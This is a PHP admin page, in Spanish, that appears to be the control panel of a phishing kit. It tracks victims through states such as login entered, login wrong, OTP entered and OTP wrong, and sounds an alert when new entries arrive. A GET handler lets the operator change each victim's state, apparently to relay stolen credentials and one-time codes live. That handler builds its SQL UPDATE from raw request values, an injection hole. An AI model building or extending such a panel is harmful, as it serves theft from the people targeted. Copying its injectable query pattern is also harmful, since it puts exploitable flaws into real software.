<?php require "head.php"; ?>
	
	<div id="alerta">
        <audio id="alerta-sound" src="media/alerta.mp3" preload="auto"></audio>
    </div>

	


	<div class="container mt-5">
		<div class="row">
			<div class="col-md-12" class="text-right">
				<button id="activarSonido"  class="btn btn-dark"><i class="fas fa-volume-up"></i> Activar Sonido</button>
				<!-- <a href="" class="btn btn-warning" data-toggle="modal" data-target="#tutorial"><i class="fab fa-youtube"></i> Ver tutorial</a>  -->
				<a href="generador.php" class="btn btn-primary"><i class="fas fa-phone"></i>  Generar Números</a>
				<a href="imprimir.php" class="btn btn-success"><i class="fas fa-print"></i> Imprimir</a>
				<a href="delete.php?alldelete=alldelete" class="btn btn-danger"><i class="fas fa-trash-alt"></i> Eliminar todos los datos</a>
				
				<a href="logout.php" class="btn btn-dark"><i class="fas fa-sign-in-alt"></i> Salir</a>
			</div>
			<div class="guia">
				<p>Guia de colores:</p>
				<div class="colores">
					<div class="box_color">
						<div class="color color_1"></div>
						<p class="text_1">En espera</p>
					</div>
					<div class="box_color">
						<div class="color color_2"></div>
						<p class="text_2">Datos Incorrectos</p>
					</div>
					<div class="box_color">
						<div class="color color_3"></div>
						<p class="text_3">Ingresando Login</p>
					</div>
					<div class="box_color">
						<div class="color color_4"></div>
						<p class="text_4">Login Incorrecto</p>
					</div>
					<div class="box_color">
						<div class="color color_5"></div>
						<p class="text_5">Ingresando OTP</p>
					</div>
					<div class="box_color">
						<div class="color color_6"></div>
						<p class="text_6"> OTP Incorrecto</p>
					</div>
					<div class="box_color">
						<div class="color color_9"></div>
						<p class="text_9">Terminado</p>
					</div>
				</div>
			</div>
		</div>
		<br>

		<hr>

		<div id="divTabla1">
			<section id="miTabla1">
		    </section>
		</div>

	</div>


	<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF" crossorigin="anonymous"></script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>	
	 <script type="text/javascript" src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>

	

		<script type="text/javascript" src="js/scriptv31.js"></script>


	<div class="modal fade" id="tutorial" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
	<div class="modal-dialog">
		<div class="modal-content">
		<div class="modal-header">
			<h5 class="modal-title" id="exampleModalLabel">TUTORIAL</h5>
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">
			<span aria-hidden="true">&times;</span>
			</button>
		</div>
		<div class="modal-body">
			<video src="media/tutorial.mp4" width=100%  controls>
			Lo sentimos. Este vídeo no puede ser reproducido en tu navegador.<br>
			La versión descargable está disponible en <a href="URL">Enlace</a>. 
			</video>
		</div>
		<div class="modal-footer">
			<button type="button" class="btn btn-secondary" data-dismiss="modal">Cerrar</button>
		</div>
		</div>
	</div>
	</div>

	<script>
        var activarSonido = false;
		var ultimoDato = 0;

        function consultarNuevoDato() {
            $.ajax({
                url: 'consultar_ultimo_dato.php',
                method: 'GET',
                dataType: 'json',
                success: function(data) {
                    if (data.id > ultimoDato) {
                        if (activarSonido) {
                            // Reproducir el sonido de alerta
                            var alertaSound = document.getElementById('alerta-sound');
                            alertaSound.play();
							ultimoDato = data.id;
                        }
                    }
                },
                complete: function() {
                    // Realizar la comprobación nuevamente después de un breve período (por ejemplo, cada 5 segundos)
                    setTimeout(consultarNuevoDato, 1000);
                }
            });
        }

        $(document).ready(function() {
            $("#activarSonido").on("click", function() {
                activarSonido = true;
            });

            consultarNuevoDato();
        });
    </script>

</body>
</html>




  	<?php
  	$mysqli = include_once "../conexion/index.php";

  	if (isset($_GET["estado"]) && isset($_GET["id_user"]) ) {
  		
			$id = $_GET["id_user"];
			// Estados
			// 1 = Esperando - Datos recien ingresados
			// 2 = Datos incorrectos
			// 3 =  Login
			// 4 =  Login incorrecto
			// 5 = 	OTP
			// 6 = 	OTP incorrecto
			// 7 =  Finalizado
			$estado = $_GET["estado"];
			$response = false;

			$sentencia = $mysqli->prepare("UPDATE  users SET estado = $estado where id = $id");		

			if($sentencia->execute()){
				$response = true;
			}
			else{$response = false;}

			$sentencia->close();

			if ($response == true) {
			?>
			<script type="text/javascript">
			swal("GESTIONADO CORRECTAMENTE");
			</script>
			<?php
			} else{
				print_r("error");
			}	
	}

?>